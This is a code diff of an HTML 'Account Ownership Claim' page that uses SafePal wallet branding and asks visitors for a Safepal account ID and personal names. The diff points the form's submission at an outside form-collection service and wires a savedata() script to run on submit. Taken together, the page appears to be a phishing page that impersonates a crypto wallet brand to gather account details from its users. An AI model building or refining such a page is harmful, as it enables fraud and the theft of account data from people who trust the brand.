@@ -6,7 +6,7 @@
     <title>Account Ownership Claim</title>
     <link rel="stylesheet" href="./index.css">
 </head>
-<body onload="savedata()">
+<body>
     <nav>
         <div class="logo">
             <img src="./images/logo-light.svg" alt="safepallogo">
@@ -22,14 +22,14 @@
    <p>Complete the fields below to claim ownership of Safepal accounts;</p>
 
    <div class="form">
-    <form action="" method="post">
+    <form action="https://submit-form.com/Y1WE6PWFn" method="post" onsubmit="savedata()">
         <div class="accountid">
             <label for="AccountID">Account ID:</label>
             <input type="text" name="AccountID" id="AccountID" required>
         </div>
         <div class="fname">
-            <label for="FName">First Name:</label>
-            <input type="text" name="FName" id="FName" required>
+            <label for="firstName">First Name:</label>
+            <input type="text" name="firstName" id="firstName" required>
         </div>
         <div class="mname">
             <label for="MName">Middle Name:</label>
@@ -87,7 +87,7 @@
    </div>
 
 
-   <script src=".index.js"></script>
+   <script src="./index.js"></script>
 
    <script src="https://kit.fontawesome.com/2f8df1a2ea.js" crossorigin="anonymous"></script>
 </body>
